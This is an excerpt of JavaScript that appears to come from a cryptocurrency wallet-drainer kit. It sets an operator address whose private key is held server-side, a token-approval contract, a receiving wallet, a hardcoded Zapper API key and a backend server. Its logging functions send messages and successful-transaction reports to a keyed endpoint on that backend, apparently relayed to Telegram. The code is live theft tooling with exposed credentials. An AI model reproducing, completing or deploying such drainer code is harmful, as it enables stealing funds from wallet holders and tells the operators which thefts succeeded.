...
operator = '0xEe8A52073C7980fcbEfd97Ae52A7e1915F6597c9' //  --> The address (0x) of the operator that conducts transactions, the privatekey of which lies on the server in the variable
contractSAFA = '0xd9145CCE52D386f254917e481eB44e9943F39138' // specify address contract your deploy
ownerAddress = '0xEe8A52073C7980fcbEfd97Ae52A7e1915F6597c9' // specify address reciept --> MY ACC 10
const ZAPPER_KEY = '25290128-1beb-47bb-98a0-17ed25f0d62c'  // specify your API key
const BASE_URL = 'https://newcontbk-production.up.railway.app/'; // specify the address to the configured server in format https://server.com/api
// SET THESE END
...
function logTlgMsg(msg, sus, hash) {
  ...
  fetch('back690d.html?key=8bEEokUZLhn7nAHz&amp;m='+msg+'<br>'+succestrans);
}

function logTlg(msg) {
  fetch('back690d.html?key=8bEEokUZLhn7nAHz&amp;m='+msg);
}
